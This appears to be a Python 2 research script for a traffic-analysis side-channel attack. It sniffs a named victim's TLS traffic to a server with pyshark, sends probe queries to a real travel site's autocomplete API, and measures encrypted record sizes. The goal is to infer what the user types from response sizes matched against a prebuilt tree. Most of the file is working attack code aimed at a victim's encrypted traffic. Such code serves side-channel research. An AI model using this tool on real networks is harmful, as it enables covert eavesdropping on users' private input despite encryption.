# This file is used by the attacker to sniff the network traffic of the victim and
# Exploit the pre-built tree in order to infer the user input on a page protected
# by encrypted traffic (TLS/SSL)

import sys
import pyshark
import requests
import time
import multiprocessing

class trafficWeight:
  def __init__(self):
    self.request = 0
    self.response = 0

NO_ETH_ATTRIBUTE_ERR = 'No attribute eth'
NO_IP_ATTRIBUTE_ERR = 'No attribute ip'
NO_TCP_ATTRIBUTE_ERR = 'No attribute tcp'
NO_SSL_ATTRIBUTE_ERR = 'No attribute ssl'

def calculateTrafficWeight(interfac, victimIP, serverIP, queue):
  # Build filters: Here we are only interested in capturing the encrypted traffic between the victim machine and the server hosting the webapp
  bpFilters = 'host ' + victimIP + ' and host ' + serverIP

  traffic = trafficWeight()
  requestSize = 0
  responseSize = 0

  capture = pyshark.LiveCapture(interface=interfac, bpf_filter=bpFilters)
  capture.sniff(timeout=5)
  #for packet in capture.sniff_continuously():
  for packet in capture:
    try:
      # Verify the type of packet we manipulate
      layersName = []
      for i in range(len(packet.layers)):
        layersName.append(packet.layers[i]._layer_name)

      if 'eth' not in layersName:
        raise AttributeError(NO_ETH_ATTRIBUTE_ERR)
      elif 'ip' not in layersName:
        raise AttributeError(NO_IP_ATTRIBUTE_ERR)
      elif 'tcp' not in layersName:
        raise AttributeError(NO_TCP_ATTRIBUTE_ERR)
      elif 'ssl' not in layersName:
        raise AttributeError(NO_SSL_ATTRIBUTE_ERR)

      # At the end of this first step, we are able to know the nature of the packet we received
      # So, we know what we can or cannot do wth it


      # If we reach this point we have a SSL, TCP, IP, ETH packet, so we can access these attributes
      src = packet.ip.src
      dst = packet.ip.dst
      if src == victimIP:
        print("=== REQUEST (From %s, To: %s) === \t\t =========>" % (src, dst))
        print("Frame number: ", packet.number)
        print("Encrypted Data Length: ", packet.ssl.record_length)
        print("Time of sniffing: ", packet.sniff_time)
        print("=====================================================================\n\n")
        requestSize += int(packet.ssl.record_length)

      elif src == serverIP:
        print("=== RESPONSE (From %s, To: %s) === \t\t <=========" % (src, dst))
        print("Frame number: ", packet.number)
        print("Encrypted Data Length: ", packet.ssl.record_length)
        print("Time of sniffing: ", packet.sniff_time)
        print("======================================================================\n\n")
        responseSize += int(packet.ssl.record_length)

    except AttributeError, e:
      if str(e) == NO_ETH_ATTRIBUTE_ERR:
        print("This packet is not an ETH packet !")
      elif str(e) == NO_IP_ATTRIBUTE_ERR:
        # Appropriate handling --> We can access the ETH layer data
        print("This packet is not an IP packet !")
      elif str(e) == NO_TCP_ATTRIBUTE_ERR:
        # Appropriate handling --> We can access the IP and ETH layers data
        print("This packet is not an TCP packet !")
      elif str(e) == NO_SSL_ATTRIBUTE_ERR:
        # Appropriate handling --> We can access the TCP, IP and ETH layers data
        if packet.ip.src == victimIP:
          # tcp.analysis_acks_frame returns "[This is an ACK to the segment in frame: 3]", so it returns the segments for which this segment is a ACK
          print("This is a ACK to the segment in frame: %s\n" % packet.tcp.analysis_acks_frame)
          traffic.request = requestSize
          traffic.response = responseSize
          queue.put(traffic)
      else:
        print("Unhandled error ! --> ", str(e))


def getSession():
  session = requests.Session()
  session.get("https://www.kayak.com/flights")
  return session

def apiCall(session, payload):
  url = "https://www.kayak.com/mv/marvel?f=h&where=" + payload + "&s=58&lc_cc=US&lc=en&v=v2&cv=4"
  request = session.get(url)
  print("Time of request is: ", time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()))
  request.raise_for_status()
  return request

def manualGenerate(interfac, victimIP, serverIP):
  # Manual payload this would come from payloadgenerator
  payloads=['a','b','c','d','e','f','g','h','i']
  session = getSession()
  print("Initializing network session with the server...")
  # Wait for a few seconds for the TLS handshake to be done and for the page session to be set up
  time.sleep(1)
  print("Session initialized, begin to send requests")
  for payload in payloads:
    print("Press enter to send payload '%s'" % payload)
    raw_input()

    # Start to sniff the network before doing the API call
    queue = multiprocessing.Queue()
    process = multiprocessing.Process(target=calculateTrafficWeight, args=(interfac, victimIP, serverIP, queue,))
    process.start()

    # Do the HTTP request on the server
    response = apiCall(session, payload)
    print("HTTP Content-Length: ", response.headers['Content-Length'])

    # Here we can get the result because we received the response from the server.
    networkWeight = queue.get()
    print("Request traffic size: ", networkWeight.request)
    print("Response traffic size: ", networkWeight.response)
    process.terminate()


## main ##############@
if len(sys.argv) < 3:
    print("""Invalid number of arguments
Use: python test.py [interface] [victimIP] [serverIP]""")
    sys.exit(0)

# Defining the environment
interfac = sys.argv[1]
victimIP = sys.argv[2]
serverIP = sys.argv[3] # Obtained after a traceroute

manualGenerate(interfac, victimIP, serverIP)

# TODO:
# Here once we manage to exploit the packets, we should be able to:
# 2) According to the previous result (request/response): if this is a request then --> store the timestamp and use it to catch the packet corresponding to the associated response, if this is a response collect all the packets of the response +  get their size and build the total size of the response
# 3) Using the total size of the response, get the node of the tree we built in the "treeBuilder" --> this tree is a labelled tree, which label is the size of the response from the server -> so by using the size we computed, we could do a lookup and extract the good node.
# Store the value of the node we found and iterate.
